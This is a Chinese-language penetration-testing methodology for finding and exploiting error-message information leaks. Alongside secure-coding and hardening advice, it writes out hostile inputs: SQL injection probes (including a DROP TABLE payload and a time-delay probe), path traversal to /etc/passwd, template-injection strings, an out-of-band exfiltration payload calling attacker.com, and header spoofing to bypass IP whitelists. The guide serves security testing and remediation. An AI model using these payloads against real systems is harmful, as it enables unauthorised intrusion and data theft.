# 错误信息泄露利用方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供一套标准化的错误信息泄露检测与利用流程，帮助识别应用程序因配置不当导致的敏感信息暴露问题，评估信息泄露对系统安全的影响，并提供修复建议。

### 1.2 适用范围
- 所有 Web 应用程序和 API 接口
- 应用服务器、Web 服务器配置
- 数据库连接错误页面
- 自定义错误处理机制
- 第三方组件错误输出

### 1.3 读者对象
- 渗透测试工程师
- 安全分析师
- 应用安全开发人员
- 系统运维人员

## 第二部分：核心渗透技术专题

### 专题：错误信息泄露攻击

#### 2.1 技术介绍

错误信息泄露是指应用程序在遇到异常情况时，向用户返回了包含敏感信息的错误页面或消息。其本质是**应用程序未能正确处理异常情况，将本应隐藏的内部实现细节暴露给了外部用户**。

**泄露的敏感信息类型：**

| 信息类型 | 具体内容 | 危害等级 |
|---------|---------|---------|
| 技术栈信息 | 服务器版本、框架类型、编程语言版本 | 中 |
| 路径信息 | 绝对路径、文件结构、目录布局 | 中 |
| 数据库信息 | SQL 语句、表名、字段名、连接字符串 | 高 |
| 认证信息 | 用户名、密码哈希、Session ID、API 密钥 | 高 |
| 代码逻辑 | 堆栈跟踪、源代码片段、业务逻辑 | 高 |
| 系统信息 | 操作系统版本、环境变量、配置参数 | 中 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **用户认证** | 登录失败、密码重置 | 可能暴露用户名是否存在、SQL 查询语句 |
| **数据查询** | 搜索功能、筛选器 | 可能暴露数据库结构、SQL 语句 |
| **文件操作** | 文件上传、下载、删除 | 可能暴露服务器路径、权限信息 |
| **API 调用** | RESTful 接口、GraphQL | 可能暴露内部错误码、堆栈信息 |
| **表单提交** | 注册、评论、反馈 | 可能暴露验证逻辑、数据库操作 |
| **管理后台** | 配置修改、数据导出 | 可能暴露系统配置、连接信息 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**输入点识别：**
- 所有用户可控的输入参数（GET/POST/PUT/DELETE）
- HTTP 请求头（User-Agent、Cookie、Referer）
- 文件上传功能
- API 接口的所有端点

**探测方法：**

| 探测类型 | 测试 Payload | 预期结果 |
|---------|-------------|---------|
| **SQL 错误触发** | `'`、`"`、`'; DROP TABLE--` | SQL 语法错误页面 |
| **路径遍历** | `../../../etc/passwd`、`..\\..\\windows\\system32` | 文件路径错误 |
| **类型不匹配** | 数字参数传入字符串、数组传入单值 | 类型转换错误 |
| **空值测试** | 空参数、null 值、undefined | 空指针异常 |
| **超大输入** | 超长字符串、超大文件 | 内存溢出错误 |
| **特殊字符** | `<script>`、`${7*7}`、`{{7*7}}` | 模板注入错误 |

**结果验证：**
- 检查 HTTP 状态码（500、502、503、504）
- 分析响应内容中的错误信息
- 查看响应头中的服务器信息
- 使用浏览器开发者工具查看控制台输出

##### 2.3.2 白盒测试

**代码审计要点：**

1. **错误处理机制检查**
   ```java
   // ❌ 不安全：直接输出异常信息
   catch (Exception e) {
       response.getWriter().write(e.getMessage());
   }
   
   // ✅ 安全：使用统一错误页面
   catch (Exception e) {
       logger.error("Error occurred", e);
       response.sendError(500, "Internal Server Error");
   }
   ```

2. **日志配置检查**
   - 检查 `web.xml`、`application.properties` 等配置文件
   - 确认生产环境是否关闭了调试模式
   - 验证错误页面是否配置了自定义页面

3. **框架配置检查**
   - Spring Boot: `server.error.include-*` 配置
   - Django: `DEBUG = False`
   - ASP.NET: `customErrors mode="On"`

#### 2.4 漏洞利用方法

##### 2.4.1 信息收集

**从错误页面提取的信息：**

| 信息类型 | 利用方式 |
|---------|---------|
| **服务器版本** | 查找已知漏洞（如 Struts2、Log4j） |
| **绝对路径** | 用于文件包含、路径遍历攻击 |
| **数据库类型** | 针对性构造 SQL 注入 Payload |
| **SQL 语句** | 分析查询逻辑，构造绕过条件 |
| **堆栈跟踪** | 了解代码结构，定位关键函数 |

##### 2.4.2 进阶利用

**1. SQL 注入辅助**
```
错误信息：You have an error in your SQL syntax near 'WHERE id = '''
推断：存在 SQL 查询，参数未正确转义
利用：构造 UNION 查询获取数据
```

**2. 路径遍历辅助**
```
错误信息：File not found: /var/www/html/uploads/../../../etc/passwd
推断：应用运行在 Linux 系统，Web 根目录为 /var/www/html
利用：构造精确的路径遍历 Payload
```

**3. 反序列化攻击**
```
错误信息：java.io.InvalidClassException: com.example.User
推断：存在 Java 反序列化操作，类名已知
利用：构造恶意序列化对象
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过错误页面限制

| 限制类型 | 绕过方法 |
|---------|---------|
| **自定义错误页** | 触发不同类型的异常 |
| **错误信息过滤** | 使用编码（URL、Base64）绕过 |
| **IP 白名单** | 修改 X-Forwarded-For 头 |
| **User-Agent 过滤** | 修改为浏览器或爬虫 UA |

##### 2.5.2 隐蔽信息收集

**1. 时间差探测**
```
输入：'; WAITFOR DELAY '0:0:5'--
观察：响应时间是否延迟 5 秒
```

**2. 外带数据**
```
输入：'; SELECT LOAD_FILE('http://attacker.com/' + (SELECT version())--
观察：攻击者服务器是否收到请求
```

**3. 错误码推断**
```
不同错误对应不同 HTTP 状态码或响应长度
通过差异判断注入是否成功
```

## 第三部分：附录

### 3.1 常见框架错误配置

| 框架 | 默认行为 | 安全配置 |
|-----|---------|---------|
| **Spring Boot** | 显示完整堆栈 | `server.error.include-stacktrace=never` |
| **Django** | DEBUG=True 显示详细信息 | `DEBUG = False` |
| **ASP.NET** | 显示详细错误 | `<customErrors mode="On"/>` |
| **PHP** | 显示错误信息 | `display_errors = Off` |
| **Tomcat** | 显示版本信息 | 自定义错误页面 |

### 3.2 错误信息检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Burp Suite** | 拦截修改请求 | Intruder 模块批量测试 |
| **sqlmap** | SQL 错误检测 | `sqlmap -u "url" --batch` |
| **Nikto** | Web 服务器扫描 | `nikto -h target` |
| **whatweb** | 技术栈识别 | `whatweb target` |
| **wappalyzer** | 浏览器插件识别 | 自动识别技术栈 |

- [ ] 实施最小错误信息原则
- [ ] 配置适当的日志记录级别
- [ ] 对错误信息进行过滤和转义
- [ ] 定期审查错误日志
